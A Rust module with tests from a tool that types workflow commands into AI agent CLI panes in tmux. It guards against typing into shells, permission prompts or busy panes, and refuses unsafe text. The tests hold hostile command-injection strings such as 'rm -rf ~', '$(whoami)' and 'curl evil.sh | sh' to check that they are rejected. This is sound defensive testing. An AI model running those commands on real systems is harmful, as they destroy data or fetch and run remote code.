//! Submission of a spec format's declared workflow entry point as its own
//! composer line, once each agent's pane goes idle after its first prompt.

use super::Output;

/// One pane still owing its declared workflow entry point.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct PendingEntryPoint {
    /// The pane the entry point is destined for.
    pub(crate) pane_index: usize,
    /// Broker id of the agent in that pane, for the expiry message.
    pub(crate) agent_id: String,
    /// The exact line to type — rendered from the backend's bundled template.
    pub(crate) entry_point: String,
    /// That CLI's settle delay, used both as the poll interval and between
    /// the literal send and its `Enter`.
    pub(crate) settle_delay_ms: u64,
}

/// How long the launch waits, across all panes at once, for agents to finish
/// their first turn before giving up on typing their entry points.
pub(crate) const ENTRY_POINT_BUDGET_MS: u64 = 120_000;

/// The floor on the poll interval, so a CLI configured with a tiny settle
/// delay does not turn the wait into a `capture-pane` spin.
pub(crate) const ENTRY_POINT_MIN_POLL_MS: u64 = 250;

/// Consecutive idle captures required before anything is typed. Two, so the
/// instant between the prompt's `Enter` and the CLI starting its turn — which
/// reads as idle — cannot be mistaken for a finished turn.
pub(crate) const ENTRY_POINT_IDLE_CAPTURES: u8 = 2;

/// The clock [`submit_entry_points_with`] waits on, so the wait's decisions
/// are testable over scripted screens without real time passing. The surface
/// I/O goes through the terminal port.
pub(crate) trait EntryPointClock {
    /// Wait `ms` milliseconds.
    fn sleep(&mut self, ms: u64);
    /// Milliseconds elapsed since the wait began.
    fn elapsed_ms(&self) -> u64;
}

/// The live clock.
pub(crate) struct WallClock {
    pub(crate) started: std::time::Instant,
}

impl WallClock {
    fn new() -> Self {
        Self {
            started: std::time::Instant::now(),
        }
    }
}

impl EntryPointClock for WallClock {
    fn sleep(&mut self, ms: u64) {
        std::thread::sleep(std::time::Duration::from_millis(ms));
    }

    fn elapsed_ms(&self) -> u64 {
        u64::try_from(self.started.elapsed().as_millis()).unwrap_or(u64::MAX)
    }
}

/// Why a pane did not receive (or did not complete) its entry point.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum EntryPointFailure {
    /// The budget elapsed with the pane never idle. Nothing was typed.
    Expired,
    /// The pane's foreground process is a shell, not an agent CLI — its own
    /// CLI exited (GP-03c). Nothing was typed.
    ShellPane(String),
    /// The rendered entry point carries characters outside the safe set.
    /// Nothing was typed, for any pane.
    UnsafeText,
    /// The text was typed, but the pane stopped being responsive before the
    /// `Enter`, which was withheld. The text is sitting in the composer.
    TypedNotSubmitted,
}

/// A pane that owes (or half-owes) its entry point, and why.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct EntryPointReport {
    pub(crate) pane: PendingEntryPoint,
    pub(crate) failure: EntryPointFailure,
}

/// The characters a rendered entry point may contain: letters, digits, and
/// `. _ : / <space> -`.
///
/// The rendered text is the backend's template with the spec id substituted,
/// and a spec id is a change-directory name that nothing validates. A
/// directory may legally be named with shell metacharacters, and a pane whose
/// CLI has exited is a shell — so the substituted text is refused outright
/// rather than relying on the pane check alone to keep it away from a command
/// interpreter. The set is what a workflow command legitimately needs: a
/// slash command, a colon-namespaced name, a path-like or dotted id.
pub(crate) fn entry_point_text_is_safe(text: &str) -> bool {
    !text.is_empty()
        && text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | ':' | '/' | ' ' | '-'))
}

/// The bounded, all-panes-at-once wait behind [`submit_entry_points`],
/// reading screens and typing through the terminal port and waiting on
/// `clock`.
///
/// Polls every pane still owing an entry point on one shared interval — so
/// the launch costs the slowest first turn rather than the sum of them — and
/// types into a pane only when ALL of the following hold:
///
/// 1. the rendered text passes [`entry_point_text_is_safe`];
/// 2. [`pane_is_idle_and_empty`] holds on [`ENTRY_POINT_IDLE_CAPTURES`]
///    consecutive successful captures, and once more on a fresh capture taken
///    immediately before the keystroke (the TOCTOU discipline the drive
///    loop's `submit_buffered_input` applies);
/// 3. the pane's foreground process is not a shell. A pane whose CLI exited
///    looks idle to every capture-based predicate — it has no input box, no
///    prompt, no mid-response marker — so looking at the pane alone cannot
///    tell a waiting CLI from a command interpreter. This is NOT the
///    "unrecognised CLI is treated as idle" rule being walked back: a shell
///    process is not a CLI whose markers went unrecognised.
///
/// The `Enter` is then sent as a separate keystroke after the settle delay —
/// and the pane is captured once more first. A fork or a tool call can raise
/// a permission prompt during that delay, and an `Enter` arriving then
/// answers it. When that happens the `Enter` is withheld and the pane is
/// reported [`EntryPointFailure::TypedNotSubmitted`].
///
/// Returns one report per pane that did not complete, in input order.
///
/// [`pane_is_idle_and_empty`]: crate::supervisor::drive::pane_is_idle_and_empty
pub(crate) fn submit_entry_points_with<C: EntryPointClock>(
    backend: &dyn crate::terminal::TerminalBackend,
    clock: &mut C,
    session: &str,
    mut pending: Vec<PendingEntryPoint>,
    budget_ms: u64,
) -> Vec<EntryPointReport> {
    use crate::supervisor::drive::{pane_is_idle_and_empty, pane_is_responsive};
    use crate::terminal::Key;

    // A capture we could not take is not evidence of idleness: an empty
    // string satisfies every idle marker there is.
    let looks_idle = |capture: Option<String>| capture.is_some_and(|c| pane_is_idle_and_empty(&c));

    let mut reports: Vec<EntryPointReport> = Vec::new();
    // Refuse unsafe text before any waiting: it cannot become safe, and the
    // pane it would be typed into may be a shell.
    pending.retain(|p| {
        if entry_point_text_is_safe(&p.entry_point) {
            return true;
        }
        reports.push(EntryPointReport {
            pane: p.clone(),
            failure: EntryPointFailure::UnsafeText,
        });
        false
    });
    if pending.is_empty() {
        return reports;
    }
    // One interval for every pane: at least the slowest CLI's settle delay,
    // so each pane's first capture lands no sooner than one settle delay
    // after its prompt's `Enter` and consecutive captures stay that far
    // apart.
    let poll_ms = pending
        .iter()
        .map(|p| p.settle_delay_ms)
        .max()
        .unwrap_or_default()
        .max(ENTRY_POINT_MIN_POLL_MS);
    let mut idle_streak = vec![0u8; pending.len()];

    loop {
        clock.sleep(poll_ms);
        let mut idx = 0;
        while idx < pending.len() {
            let surface = backend.surface_at(session, pending[idx].pane_index);
            if looks_idle(backend.capture_tail(&surface)) {
                idle_streak[idx] += 1;
            } else {
                idle_streak[idx] = 0;
            }
            if idle_streak[idx] < ENTRY_POINT_IDLE_CAPTURES {
                idx += 1;
                continue;
            }
            // Look once more, immediately before typing.
            if !looks_idle(backend.capture_tail(&surface)) {
                idle_streak[idx] = 0;
                idx += 1;
                continue;
            }
            // A pane that looks idle may simply have no CLI left in it.
            //
            // A process we could not read is not a process we may type into:
            // the read fails when the pane has vanished or been
            // respawned since the idle re-check a moment ago, which is
            // exactly the window where it might now be a shell. Reset the
            // streak and look again on the next poll rather than typing on
            // the strength of a failed read; if it never resolves, the budget
            // reports it.
            let Some(command) = backend.foreground_process(&surface) else {
                idle_streak[idx] = 0;
                idx += 1;
                continue;
            };
            if crate::tmux::is_shell_command(&command) {
                reports.push(EntryPointReport {
                    pane: pending.remove(idx),
                    failure: EntryPointFailure::ShellPane(command),
                });
                idle_streak.remove(idx);
                continue;
            }
            let settled = pending[idx].settle_delay_ms;
            let text = pending[idx].entry_point.clone();
            let _ = backend.send_text(&surface, &text);
            clock.sleep(settled);
            // The settle delay is a window in which a fork or a tool call can
            // raise a permission prompt. An `Enter` arriving then ANSWERS it,
            // so look before submitting and withhold the key if anything
            // changed.
            let still_ours = backend
                .capture_tail(&surface)
                .is_some_and(|c| pane_is_responsive(&c));
            if still_ours {
                let _ = backend.send_key(&surface, Key::Enter);
                pending.remove(idx);
                idle_streak.remove(idx);
            } else {
                reports.push(EntryPointReport {
                    pane: pending.remove(idx),
                    failure: EntryPointFailure::TypedNotSubmitted,
                });
                idle_streak.remove(idx);
            }
        }
        if pending.is_empty() || clock.elapsed_ms() >= budget_ms {
            reports.extend(pending.into_iter().map(|pane| EntryPointReport {
                pane,
                failure: EntryPointFailure::Expired,
            }));
            return reports;
        }
    }
}

/// Submits each pane's declared workflow entry point as its own composer
/// line, once that pane is idle.
///
/// Call this after every agent's first prompt has been submitted. Panes whose
/// spec format declares no entry point are simply not in `pending`, and are
/// never waited for. A pane the budget expires on is left untouched and
/// reported on stderr with the exact line to submit by hand, so an attached
/// human or an orchestrator reading the launch output can finish the job.
pub(crate) fn submit_entry_points(
    backend: &dyn crate::terminal::TerminalBackend,
    session: &str,
    pending: Vec<PendingEntryPoint>,
    out: &mut dyn Output,
) {
    if pending.is_empty() {
        return;
    }
    let budget_ms = std::env::var("GIT_PAW_ENTRY_POINT_BUDGET_MS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(ENTRY_POINT_BUDGET_MS);
    // Say so before blocking. This wait runs before the attach (or the
    // `Added '<branch>'` line), so without this the terminal goes silent for
    // up to the whole budget while an agent finishes its first turn, and a
    // user has no way to tell a slow launch from a hung one.
    out.line(&format!(
        "Waiting for {} agent(s) to go idle before submitting their workflow command \
         (up to {})...",
        pending.len(),
        format_budget(budget_ms)
    ));
    let reports =
        submit_entry_points_with(backend, &mut WallClock::new(), session, pending, budget_ms);
    for report in reports {
        out.warn(&entry_point_expiry_notice(&report, budget_ms));
    }
}

/// The stderr line reporting a pane that did not get (or did not complete)
/// its entry point.
///
/// Every variant names the pane, the agent and the EXACT command
/// (`boot-block`, "A declared workflow entry point is submitted as its own
/// composer line", rule 4): an attached human types it, and an orchestrator
/// reading the launch output has everything it needs to finish the job. What
/// differs is the reason and therefore the remedy — a withheld `Enter` leaves
/// the text already in the composer, so re-typing it would double it.
/// Split out of [`submit_entry_points`] so the contract is testable without
/// capturing a subprocess's stderr.
pub(crate) fn entry_point_expiry_notice(report: &EntryPointReport, budget_ms: u64) -> String {
    let pane = &report.pane;
    let (reason, remedy) = match &report.failure {
        EntryPointFailure::Expired => (
            format!("did not go idle within {}", format_budget(budget_ms)),
            format!(
                "once the agent is idle, submit: {}",
                pane.entry_point.as_str()
            ),
        ),
        EntryPointFailure::ShellPane(command) => (
            format!("is running a shell ({command}), not an agent CLI — its CLI exited"),
            format!(
                "restart the agent, then submit: {}",
                pane.entry_point.as_str()
            ),
        ),
        EntryPointFailure::UnsafeText => (
            "has a workflow command carrying characters that are unsafe to type".to_string(),
            format!(
                // Debug-escaped, not raw: this text came from a directory
                // name nothing validates, and printing it raw would let
                // control or ANSI sequences in that name reach the operator's
                // terminal — moving the cursor, clearing the screen, or
                // rewriting the warning that is reporting it.
                "check the spec id, then submit by hand if it is sound: {:?}",
                pane.entry_point.as_str()
            ),
        ),
        EntryPointFailure::TypedNotSubmitted => (
            "stopped responding between the typed command and its Enter, which was \
             withheld so it could not answer a prompt"
                .to_string(),
            format!(
                "the command is already in the composer — do NOT retype it; once the pane \
                 is clear, press Enter to submit: {}",
                pane.entry_point.as_str()
            ),
        ),
    };
    format!(
        "warning: pane {} ({}) {reason}, so its workflow command was not submitted; {remedy}",
        pane.pane_index, pane.agent_id,
    )
}

/// Renders a budget for a human: whole seconds, or milliseconds below one
/// second. Integer-dividing by 1000 would report a test's 800 ms override as
/// "0s", which reads as "it never waited".
pub(crate) fn format_budget(budget_ms: u64) -> String {
    if budget_ms >= 1000 {
        format!("{}s", budget_ms / 1000)
    } else {
        format!("{budget_ms}ms")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // -----------------------------------------------------------------------
    // submit_entry_points_with — the bounded idle wait before a declared
    // workflow entry point is typed (`boot-block`, "A declared workflow entry
    // point is submitted as its own composer line")
    // -----------------------------------------------------------------------

    /// A virtual clock: sleeping advances it, nothing waits.
    #[derive(Default)]
    struct VirtualClock {
        elapsed: u64,
    }

    impl EntryPointClock for VirtualClock {
        fn sleep(&mut self, ms: u64) {
            self.elapsed += ms;
        }

        fn elapsed_ms(&self) -> u64 {
            self.elapsed
        }
    }

    /// The shared fake terminal backend scripted per pane, plus a virtual
    /// clock. Each pane's screens are read one capture at a time and the
    /// final one repeats, so a fixture that never goes idle simply runs the
    /// budget out.
    struct FakeEntryPointIo {
        backend: crate::terminal::fake::FakeBackend,
        clock: VirtualClock,
        panes: Vec<usize>,
    }

    /// The sentinel a script entry uses to mean "this read FAILED" — not
    /// "the pane was empty". The two are opposites for the idle decision.
    const CAPTURE_FAILED: &str = "<<capture-failed>>";

    /// The session every entry-point fixture runs in.
    const SESSION: &str = "paw-x";

    impl FakeEntryPointIo {
        fn new(scripts: &[(usize, &[&str])]) -> Self {
            use crate::terminal::TerminalBackend;
            let backend = crate::terminal::fake::FakeBackend::new();
            for (pane, script) in scripts {
                let screens: Vec<Option<&str>> = script
                    .iter()
                    .map(|frame| (*frame != CAPTURE_FAILED).then_some(*frame))
                    .collect();
                backend.script_screens(&backend.surface_at(SESSION, *pane), &screens);
            }
            Self {
                backend,
                clock: VirtualClock::default(),
                panes: scripts.iter().map(|(pane, _)| *pane).collect(),
            }
        }

        /// Makes `pane`'s foreground process `command` (e.g. a shell name),
        /// or a failed read for [`CAPTURE_FAILED`].
        fn with_command(self, pane: usize, command: &str) -> Self {
            use crate::terminal::TerminalBackend;
            self.backend.script_foreground_process(
                &self.backend.surface_at(SESSION, pane),
                (command != CAPTURE_FAILED).then_some(command),
            );
            self
        }

        /// Every keystroke, in order, as `(pane, "text:…" | "key:…")`.
        fn sent(&self) -> Vec<(usize, String)> {
            use crate::terminal::TerminalBackend;
            use crate::terminal::fake::Operation;
            let pane_of = |surface: &crate::terminal::SurfaceId| {
                self.panes
                    .iter()
                    .copied()
                    .find(|p| self.backend.surface_at(SESSION, *p) == *surface)
                    .expect("keystroke on a scripted pane")
            };
            self.backend
                .operations()
                .into_iter()
                .filter_map(|op| match op {
                    Operation::SendText { surface, text } => {
                        Some((pane_of(&surface), format!("text:{text}")))
                    }
                    Operation::SendKey { surface, key } => {
                        Some((pane_of(&surface), format!("key:{key:?}")))
                    }
                    Operation::PrefillText { .. } => panic!("the entry point is never pre-filled"),
                    _ => None,
                })
                .collect()
        }
    }

    fn pending(pane_index: usize) -> PendingEntryPoint {
        PendingEntryPoint {
            pane_index,
            agent_id: "feat-x".to_string(),
            entry_point: "/opsx:apply my-change".to_string(),
            settle_delay_ms: 100,
        }
    }

    /// An idle pane with an empty composer. Two consecutive idle captures and
    /// a third confirming one immediately before the keystroke.
    const IDLE: &str = "● Ran tool\n  ? for shortcuts";
    /// The mid-response footer of the embedded prompt profile.
    const MID_RESPONSE: &str = "● Thinking…\n  esc to interrupt";
    /// A live permission prompt.
    const LIVE_PROMPT: &str =
        "Bash command\n  rm -rf /\nDo you want to proceed?\n❯ 1. Yes\n  2. No\n(esc to cancel)";
    /// An idle pane whose composer already holds somebody else's text.
    const BUFFERED: &str =
        "● Ran tool\n────────────────\n❯ please continue\n────────────────\n  ? for shortcuts";

    /// Maps to scenario "The `OpenSpec` entry point is submitted after the
    /// first message": an idle pane gets the line typed literally and its own
    /// separate `Enter`.
    #[test]
    fn an_idle_pane_receives_the_entry_point_and_its_own_enter() {
        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE])]);
        let expired = submit_entry_points_with(
            &io.backend,
            &mut io.clock,
            SESSION,
            vec![pending(1)],
            60_000,
        );
        assert!(expired.is_empty(), "the pane was idle, so nothing expired");
        assert_eq!(
            io.sent(),
            vec![
                (1, "text:/opsx:apply my-change".to_string()),
                (1, "key:Enter".to_string()),
            ]
        );
    }

    /// Maps to `code-architecture` scenario "Entry-point idle wait and submit
    /// are asserted without tmux": a busy screen and then idle screens are
    /// observed only through screen-tail reads; typing waits for the idle
    /// streak, a fresh read and the foreground-process read, and the entry
    /// point goes out as a text operation, a further read, then `Enter`.
    #[test]
    fn the_entry_point_wait_and_submit_go_through_the_terminal_port() {
        use crate::terminal::fake::Operation;
        use crate::terminal::{Key, TerminalBackend};
        let mut io = FakeEntryPointIo::new(&[(1, &[MID_RESPONSE, IDLE])]);
        let reports = submit_entry_points_with(
            &io.backend,
            &mut io.clock,
            SESSION,
            vec![pending(1)],
            60_000,
        );
        assert!(reports.is_empty(), "the pane went idle: {reports:?}");
        let surface = io.backend.surface_at(SESSION, 1);
        let read = Operation::CaptureTail(surface.clone());
        assert_eq!(
            io.backend.operations_on(&surface),
            vec![
                read.clone(), // busy
                read.clone(), // idle 1
                read.clone(), // idle 2
                read.clone(), // fresh read immediately before typing
                Operation::ForegroundProcess(surface.clone()),
                Operation::SendText {
                    surface: surface.clone(),
                    text: "/opsx:apply my-change".to_string(),
                },
                read, // the pre-Enter re-check
                Operation::SendKey {
                    surface,
                    key: Key::Enter,
                },
            ]
        );
    }

    /// Maps to scenario "A busy pane is not typed into": the mid-response
    /// marker keeps the streak at zero, so the budget expires untouched.
    #[test]
    fn a_pane_mid_response_is_never_typed_into() {
        let mut io = FakeEntryPointIo::new(&[(1, &[MID_RESPONSE])]);
        let expired =
            submit_entry_points_with(&io.backend, &mut io.clock, SESSION, vec![pending(1)], 1_000);
        assert_eq!(expired.len(), 1, "the pane never went idle");
        assert!(io.sent().is_empty(), "no keystroke may reach a busy pane");
    }

    /// Maps to scenario "A pane at a permission prompt gets nothing typed" —
    /// both halves: nothing is typed, AND stderr names the pane and the exact
    /// command so a human or an orchestrator can finish the job.
    #[test]
    fn a_pane_at_a_permission_prompt_is_never_typed_into() {
        let mut io = FakeEntryPointIo::new(&[(1, &[LIVE_PROMPT])]);
        let expired =
            submit_entry_points_with(&io.backend, &mut io.clock, SESSION, vec![pending(1)], 1_000);
        assert_eq!(expired.len(), 1);
        assert!(
            io.sent().is_empty(),
            "a keystroke here would ANSWER the prompt"
        );

        let notice = entry_point_expiry_notice(&expired[0], 1_000);
        assert!(notice.contains("pane 1"), "names the pane; got: {notice}");
        assert!(notice.contains("feat-x"), "names the agent; got: {notice}");
        assert!(
            notice.contains("/opsx:apply my-change"),
            "names the EXACT command to submit, not a paraphrase; got: {notice}"
        );
    }

    /// The expiry notice reports the budget in whole seconds, matching what
    /// the user-guide documents.
    #[test]
    fn the_expiry_notice_reports_the_budget_in_seconds() {
        let notice = entry_point_expiry_notice(
            &EntryPointReport {
                pane: pending(2),
                failure: EntryPointFailure::Expired,
            },
            ENTRY_POINT_BUDGET_MS,
        );
        assert!(
            notice.contains("within 120s"),
            "the default budget is 120s; got: {notice}"
        );
    }

    /// A composer already holding text is not appended to: the result would
    /// be a line neither party wrote.
    #[test]
    fn a_pane_with_a_non_empty_composer_is_never_typed_into() {
        let mut io = FakeEntryPointIo::new(&[(1, &[BUFFERED])]);
        let expired =
            submit_entry_points_with(&io.backend, &mut io.clock, SESSION, vec![pending(1)], 1_000);
        assert_eq!(expired.len(), 1);
        assert!(io.sent().is_empty());
    }

    /// A single idle capture is not enough — the instant between the
    /// prompt's `Enter` and the CLI starting its turn reads as idle.
    #[test]
    fn one_idle_capture_is_not_enough_to_type() {
        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE, MID_RESPONSE])]);
        let expired =
            submit_entry_points_with(&io.backend, &mut io.clock, SESSION, vec![pending(1)], 1_000);
        assert_eq!(expired.len(), 1, "the streak was broken before the second");
        assert!(io.sent().is_empty());
    }

    /// The TOCTOU re-check: two idle captures, then a permission prompt on
    /// the capture taken immediately before typing. Nothing is sent.
    #[test]
    fn a_prompt_raised_between_the_check_and_the_keystroke_cancels_it() {
        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE, IDLE, LIVE_PROMPT])]);
        let expired =
            submit_entry_points_with(&io.backend, &mut io.clock, SESSION, vec![pending(1)], 1_000);
        assert_eq!(expired.len(), 1);
        assert!(
            io.sent().is_empty(),
            "the re-capture before typing must veto the keystroke"
        );
    }

    /// An unrecognised CLI matches no marker, so it reads as idle and its
    /// entry point follows the first message — what the CLI's own input
    /// queue would see from a human typing twice.
    #[test]
    fn an_unrecognised_cli_is_treated_as_idle() {
        let mut io = FakeEntryPointIo::new(&[(1, &["some other CLI's chrome, no known markers"])]);
        let expired = submit_entry_points_with(
            &io.backend,
            &mut io.clock,
            SESSION,
            vec![pending(1)],
            60_000,
        );
        assert!(expired.is_empty());
        assert_eq!(io.sent().len(), 2);
    }

    /// Maps to decision D3: the panes are waited for concurrently, so a pane
    /// that goes idle early is submitted while a slower sibling is still
    /// working — and the slow one's expiry does not hold up the fast one.
    #[test]
    fn panes_are_waited_for_concurrently_not_one_after_another() {
        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE]), (2, &[MID_RESPONSE])]);
        let expired = submit_entry_points_with(
            &io.backend,
            &mut io.clock,
            SESSION,
            vec![pending(1), pending(2)],
            1_000,
        );
        assert_eq!(
            expired
                .iter()
                .map(|r| r.pane.pane_index)
                .collect::<Vec<_>>(),
            vec![2]
        );
        assert!(io.sent().iter().all(|(pane, _)| *pane == 1));
        assert_eq!(io.sent().len(), 2);
    }

    /// Maps to scenario "A pane whose CLI has exited is not typed into".
    ///
    /// A pane that reverted to a shell (GP-03c) looks idle to every
    /// capture-based predicate — no input box, no prompt, no mid-response
    /// marker, because none of those are a shell's. Without the pane-command
    /// check the rendered command would be handed to a command interpreter.
    #[test]
    fn a_pane_that_reverted_to_a_shell_is_never_typed_into() {
        for shell in ["bash", "zsh", "sh", "fish"] {
            let mut io = FakeEntryPointIo::new(&[(1, &[IDLE])]).with_command(1, shell);
            let reports = submit_entry_points_with(
                &io.backend,
                &mut io.clock,
                SESSION,
                vec![pending(1)],
                60_000,
            );
            assert!(
                io.sent().is_empty(),
                "{shell} is a command interpreter, not a composer; sent: {:?}",
                io.sent()
            );
            assert_eq!(
                reports[0].failure,
                EntryPointFailure::ShellPane(shell.to_string())
            );
            let notice = entry_point_expiry_notice(&reports[0], 60_000);
            assert!(notice.contains(shell), "names the shell; got: {notice}");
            assert!(
                notice.contains("/opsx:apply my-change"),
                "still names the command; got: {notice}"
            );
        }
    }

    /// Maps to scenario "An unsafe rendered entry point is refused".
    ///
    /// The spec id is a change-directory name that nothing validates, and a
    /// directory may legally carry shell metacharacters. Paired with a pane
    /// that has reverted to a shell, the rendered text would be executed —
    /// so it is refused before any pane is even polled.
    #[test]
    fn an_entry_point_with_shell_metacharacters_is_refused_outright() {
        for hostile in [
            "/opsx:apply x; rm -rf ~",
            "/opsx:apply $(whoami)",
            "/opsx:apply `id`",
            "/opsx:apply x && curl evil.sh | sh",
            "/opsx:apply x\nrm -rf /",
            "/opsx:apply x > ~/.zshrc",
        ] {
            let mut pane = pending(1);
            pane.entry_point = hostile.to_string();
            let mut io = FakeEntryPointIo::new(&[(1, &[IDLE])]);
            let reports =
                submit_entry_points_with(&io.backend, &mut io.clock, SESSION, vec![pane], 60_000);
            assert!(
                io.sent().is_empty(),
                "{hostile:?} must never be typed; sent: {:?}",
                io.sent()
            );
            assert_eq!(reports[0].failure, EntryPointFailure::UnsafeText);
            assert_eq!(
                io.clock.elapsed_ms(),
                0,
                "and it must not even be waited for"
            );
        }
    }

    /// The safe set still admits what a real workflow command needs.
    #[test]
    fn ordinary_workflow_commands_pass_the_character_check() {
        for ok in [
            "/opsx:apply my-change",
            "/opsx:apply feature_123",
            "/opsx:apply 003-user-list.v2",
            "/speckit.implement T009",
        ] {
            assert!(entry_point_text_is_safe(ok), "{ok:?} must be allowed");
        }
        assert!(!entry_point_text_is_safe(""), "empty is not a command");
    }

    /// Maps to scenario "A prompt raised during the settle delay withholds
    /// the Enter".
    ///
    /// The split-send leaves a window between the typed text and its `Enter`
    /// — exactly the window a fork or a tool call raises a permission prompt
    /// in. An `Enter` arriving then ANSWERS that prompt. The captures here
    /// read idle, idle, idle (the pre-typing re-check), then a live prompt.
    #[test]
    fn a_prompt_raised_during_the_settle_delay_withholds_the_enter() {
        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE, IDLE, IDLE, LIVE_PROMPT])]);
        let reports = submit_entry_points_with(
            &io.backend,
            &mut io.clock,
            SESSION,
            vec![pending(1)],
            60_000,
        );
        assert_eq!(
            io.sent(),
            vec![(1, "text:/opsx:apply my-change".to_string())],
            "the text went out, but the Enter must be withheld"
        );
        assert_eq!(reports[0].failure, EntryPointFailure::TypedNotSubmitted);

        let notice = entry_point_expiry_notice(&reports[0], 60_000);
        assert!(
            notice.contains("do NOT retype it"),
            "the remedy must not double the text already in the composer; got: {notice}"
        );
        assert!(notice.contains("/opsx:apply my-change"), "got: {notice}");
    }

    /// Maps to scenario "A failed capture is not read as idle".
    ///
    /// `tmux capture-pane` failing yields an empty string, and an empty
    /// capture satisfies every idle marker there is — no prompt, no footer,
    /// no input box. "I could not look" must reset the streak, not complete
    /// it.
    #[test]
    fn a_failed_capture_is_not_evidence_of_idleness() {
        let mut io = FakeEntryPointIo::new(&[(1, &[CAPTURE_FAILED])]);
        let reports =
            submit_entry_points_with(&io.backend, &mut io.clock, SESSION, vec![pending(1)], 1_000);
        assert!(io.sent().is_empty(), "a blind pane must not be typed into");
        assert_eq!(reports[0].failure, EntryPointFailure::Expired);
    }

    /// And a failed capture mid-streak resets it rather than counting.
    ///
    /// The sequence is chosen so the test DISCRIMINATES: treat the failed
    /// capture as idle and the streak reaches two, the re-check sees the
    /// third frame (idle) and the text goes out. Only the reset keeps this
    /// pane untouched. Reverting the reset must turn this red.
    #[test]
    fn a_failed_capture_resets_the_idle_streak() {
        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE, CAPTURE_FAILED, IDLE, MID_RESPONSE])]);
        let reports =
            submit_entry_points_with(&io.backend, &mut io.clock, SESSION, vec![pending(1)], 1_000);
        assert!(
            io.sent().is_empty(),
            "a capture that failed must not complete the streak; sent: {:?}",
            io.sent()
        );
        assert_eq!(reports[0].failure, EntryPointFailure::Expired);
    }

    /// A pane whose foreground process cannot be read is not typed into.
    ///
    /// `display-message` fails when the pane has vanished or been respawned
    /// since the idle re-check — exactly the window in which it might now be
    /// a shell. Reading nothing is not permission to type.
    #[test]
    fn a_pane_whose_process_cannot_be_read_is_not_typed_into() {
        let mut io = FakeEntryPointIo::new(&[(1, &[IDLE])]).with_command(1, CAPTURE_FAILED);
        let reports =
            submit_entry_points_with(&io.backend, &mut io.clock, SESSION, vec![pending(1)], 1_000);
        assert!(
            io.sent().is_empty(),
            "a pane whose process could not be read must receive nothing; sent: {:?}",
            io.sent()
        );
        assert_eq!(reports[0].failure, EntryPointFailure::Expired);
    }

    /// The rejected text is Debug-escaped on stderr: it comes from a
    /// directory name nothing validates, and a raw print would let control
    /// or ANSI sequences in that name drive the operator's terminal.
    #[test]
    fn the_unsafe_text_notice_escapes_what_it_reports() {
        let mut pane = pending(1);
        pane.entry_point = "/opsx:apply \u{1b}[2Jx\nrm -rf ~".to_string();
        let notice = entry_point_expiry_notice(
            &EntryPointReport {
                pane,
                failure: EntryPointFailure::UnsafeText,
            },
            1_000,
        );
        assert!(
            !notice.contains('\u{1b}') && !notice.contains('\n'),
            "no raw escape or newline may reach the terminal; got: {notice}"
        );
        assert!(
            notice.contains("\\u{1b}") && notice.contains("\\n"),
            "the text is still reported, escaped; got: {notice}"
        );
    }

    /// Nothing is waited for when no pane declares an entry point — a launch
    /// of Markdown/Spec Kit/Superpowers specs costs no extra wall clock.
    #[test]
    fn no_declared_entry_points_means_no_wait_at_all() {
        let mut io = FakeEntryPointIo::new(&[]);
        let expired =
            submit_entry_points_with(&io.backend, &mut io.clock, SESSION, Vec::new(), 60_000);
        assert!(expired.is_empty());
        assert_eq!(
            io.clock.elapsed_ms(),
            0,
            "the loop must not even sleep once"
        );
    }
}
